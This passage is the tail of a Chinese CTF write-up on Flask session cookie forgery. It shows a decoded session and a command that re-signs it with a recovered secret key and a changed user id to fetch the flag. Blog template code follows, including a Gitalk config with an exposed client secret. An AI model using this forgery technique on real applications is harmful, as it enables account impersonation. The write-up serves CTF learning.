+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;3f8f9b00cc45f84f46d46e47e6c03572d236cafb2debb2d2cffb13034b5b2cdc0090077c6c0351d666e92fcacf91fa928ab81c8fcc83985cde3e4cd24b6a8e40&#x27;, &#x27;_user_id&#x27;: &#x27;2&#x27;, &#x27;time&#x27;: datetime.datetime(2025, 7, 16, 10, 53, 24, tzinfo=datetime.timezone.utc)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>id改为2就可以拿到flag了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 session3.py encode -s &#x27;hardgam3_C0u1d_u_f1ndM3????&#x27; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;3f8f9b00cc45f84f46d46e47e6c03572d236cafb2debb2d2cffb13034b5b2cdc0090077c6c0351d666e92fcacf91fa928ab81c8fcc83985cde3e4cd24b6a8e40&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;, &#x27;time&#x27;: &#x27;datetime.datetime(2025, 7, 16, 10, 53, 24, tzinfo=datetime.timezone.utc)&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>没试过，好像不要后面的time也可以<br>但是，注意这里不一样的地方就是我们的这个time这里，之前是没有的，我运行的时候报错了<br>这里我们给这个time后面的值加上单引号就可以了<br>最后拿到flag</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">wuk0Ng</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://web-wuk0ng.github.io/2025/07/16/cookie%E4%BC%AA%E9%80%A0%E7%B1%BB/">https://web-wuk0ng.github.io/2025/07/16/cookie%E4%BC%AA%E9%80%A0%E7%B1%BB/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">wuk0Ng</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                                    <span class="chip bg-color">比赛</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/aliyunpay.png" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <!-- 引入 Gitalk 官方 CSS（国内 CDN） -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+<!-- 引入主题自定义 CSS（如有需要，若 my-gitalk.css 是本地文件则保留原路径） -->
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+  <div class="comment_headling">
+    <i class="fas fa-comments fa-fw"></i>
+    <span>评论</span>
+  </div>
+  <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<!-- 引入 Gitalk 官方 JS（国内 CDN） -->
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+  let gitalk = new Gitalk({
+    clientID: 'Ov23liTNlK9NLcZwFSo8',
+    clientSecret: '7472cd54d6ca5e38d14f6d1b5176299bb4cf4ebe',
+    repo: 'blog---comments',
+    owner: 'web-wuk0Ng',
+    admin: ["web-wuk0Ng"],
+    id: '2025-07-16T18-00-00',
+    distractionFreeMode: false
+  });
+
+  gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2025/07/16/cookie%E4%BC%AA%E9%80%A0%E7%B1%BB/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="cookie伪造类">
+                        
+                        <span class="card-title">cookie伪造类</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-07-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                        <span class="chip bg-color">比赛</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/07/15/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="pickle反序列化">
+                        
+                        <span class="card-title">pickle反序列化</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-07-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/python/">
+                        <span class="chip bg-color">python</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2025</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">wuk0Ng</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/web-wuk0Ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:3134985131@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3442584626" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3442584626" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
